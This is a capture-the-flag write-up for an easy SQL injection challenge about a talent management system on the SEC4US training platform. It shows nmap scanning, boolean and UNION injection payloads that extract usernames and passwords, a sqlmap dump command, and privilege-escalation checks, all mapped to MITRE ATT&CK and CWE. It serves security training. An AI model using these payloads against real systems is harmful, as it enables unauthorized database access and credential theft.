# maq126: Sistema de Talentos

Writeup for the **Sistema de Talentos** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** SQL Injection  
> **Difficulty:** Easy  
> **Points:** 126

---

## Overview

A talent management system processes user input in database queries without proper parameterization, exposing a SQL injection vulnerability that allows full database extraction and system access.

## Reconnaissance

Scan the target:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Explore the web application. Identify input fields or URL parameters that interact with the database: search forms, login pages, or profile lookups.

## Exploitation

### Step 1: Identify the Injection Point

Test form inputs and URL parameters with injection probes:

```
' OR 1=1-- -
' AND 1=2-- -
```

Compare responses to confirm boolean-based or error-based SQL injection.

### Step 2: Determine Injection Type

Classify the vulnerability:

- Error-based: visible SQL errors in the response
- Boolean-based blind: different page content for true/false conditions
- UNION-based: data reflected directly in the page

### Step 3: Extract Data

For UNION-based injection:

```sql
' UNION SELECT 1,2,3,4-- -
' UNION SELECT username,password,3,4 FROM users-- -
```

For automated extraction:

```bash
sqlmap -u "http://<TARGET_IP>/talent?id=1" --dump
```

### Step 4: Access the System

Use extracted credentials to log in or SSH into the target.

### Step 5: Retrieve the Flag

Locate and read the flag file.

## Privilege Escalation

Check for escalation vectors after gaining initial access:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

## Security Framework Mapping

### MITRE ATT&CK

| Technique                         | ID        |
|-----------------------------------|-----------|
| Exploit Public-Facing Application | T1190     |
| Unsecured Credentials             | T1552     |
| Data from Information Repositories | T1213    |

### CWE

- **CWE-89:** SQL Injection
- **CWE-312:** Cleartext Storage of Sensitive Information

---

Talent systems manage people; when the queries managing them are unprotected, every record becomes a credential waiting to be read.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
